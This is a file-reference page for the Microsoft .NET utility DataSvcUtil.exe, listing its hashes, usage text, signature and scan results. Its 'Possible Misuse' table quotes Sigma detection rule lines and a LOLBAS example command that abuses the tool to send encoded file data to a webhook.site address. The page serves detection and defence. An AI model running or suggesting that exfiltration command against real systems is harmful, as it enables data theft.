---
title: DataSvcUtil.exe | DataSvcUtil.exe
excerpt: What is DataSvcUtil.exe?
---

# DataSvcUtil.exe 

* File Path: `C:\WINDOWS\Microsoft.NET\Framework\v4.0.30319\DataSvcUtil.exe`
* Description: DataSvcUtil.exe
* Comments: DataSvcUtil.exe


## Hashes

Type | Hash
-- | --
MD5 | `D524E11B25628D3CEA3AD5B0907669A3`
SHA1 | `E2FC7275DBCB818792CAB0884A251AB468032A65`
SHA256 | `EB1249C734E60C918D4538D497696481229343D09F9A05D689588FF18BA5BF94`
SHA384 | `7F4654302494588C5BD42EC25DCACD3456FE4E8DC984B8A5B793E564C3CB9D853FE77B243345BDCEAB9B77FCF5C8A961`
SHA512 | `970411511C355B792D14EB5A32AB850BA69A63AF6FB9E71DF2695DF79008838B070F4FDB2B01B0A99AD37E1BCC788E2BC1CAF56189D819D8C08939C4CEA16313`
SSDEEP | `768:tsp38EZc9l509m4LdwbKekWXAMd9r8Z6Iq8NMgCSblAgIWfCh:tG2P5/jb4WXNdJ8wVSRA+fy`
IMP | `F34D5F2D4577ED6D9CEEC516C1F5A744`
PESHA1 | `0B19BD9B7603301A8A95B65B942C36E2A0732D69`
PE256 | `BB0AF143036C62A0A1041BEF5FC4ABD4DF2DA8BF4B62F052FBC9088C61941490`

## Runtime Data

### Usage (stdout):
```cmhg
DataSvcUtil for Microsoft (R) .NET Framework version 4.8.4161.0
Copyright (C) Microsoft Corporation. All rights reserved.

                              DataSvcUtil Options
/in:<file>               The file to read the conceptual model from
/out:<file>              The file to write the generated object layer to
/language:CSharp         Generate code using the C# language
/language:VB             Generate code using the VB language
/Version:1.0             Accept CSDL documents tagged with
                         m:DataServiceVersion=1.0 or lower
/Version:2.0             Accept CSDL documents tagged with
                         m:DataServiceVersion=2.0 or lower
/DataServiceCollection   Generate collections derived from DataServiceCollection/uri:<URL>               The URI to read the conceptual model from
/help                    Display the usage message (short form: /?)
/nologo                  Suppress copyright message

                                    Examples
To generate code from a data service.
  DataSvcUtil /out:"data.cs" /uri:"http://localhost/data.svc"

To generate code from a conceptual model file.
  DataSvcUtil /out:"data.cs" /in:"file.csdl"

To generate code from a entity design model file.
  DataSvcUtil /out:"data.cs" /in:"file.edmx"


```

### Loaded Modules:

Path |
-- |
C:\WINDOWS\Microsoft.NET\Framework\v4.0.30319\DataSvcUtil.exe |
C:\WINDOWS\System32\KERNEL32.dll |
C:\WINDOWS\System32\KERNELBASE.dll |
C:\WINDOWS\SYSTEM32\MSCOREE.DLL |
C:\WINDOWS\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: DataSvcUtil.exe
* Product Name: Microsoft .NET Framework
* Company Name: Microsoft Corporation
* File Version: 4.8.4161.0
* Product Version: 4.8.4161.0
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation.  All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/74
* VirusTotal Link: https://www.virustotal.com/gui/file/eb1249c734e60c918d4538d497696481229343d09f9a05d689588ff18ba5bf94/detection

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\Microsoft.NET\Framework\v4.0.30319\DataSvcUtil.exe](DataSvcUtil.exe-DFFCFFD134C4F8540A828A2C7AFE3A7A.md) | 71
[C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\DataSvcUtil.exe](DataSvcUtil.exe-D524E11B25628D3CEA3AD5B0907669A3.md) | 100
[C:\Windows\Microsoft.NET\Framework64\v4.0.30319\DataSvcUtil.exe](DataSvcUtil.exe-DFFCFFD134C4F8540A828A2C7AFE3A7A.md) | 71

## Possible Misuse

*The following table contains possible examples of `DataSvcUtil.exe` being misused. While `DataSvcUtil.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `title: LOLBAS Data Exfiltration by DataSvcUtil.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `description: Detects when a user performs data exfiltration by using DataSvcUtil.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `- https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `- '\DataSvcUtil.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `- DataSvcUtil.exe being used may be performed by a system administrator. `{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `- DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `Name: DataSvcUtil.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `Description: DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- Command: DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- Path: C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- IOC: The DataSvcUtil.exe tool is installed in the .NET Framework directory.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- IOC: Preventing/Detecting DataSvcUtil with non-RFC1918 addresses by Network IPS/IDS.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching DataSvcUtil.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- Link: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


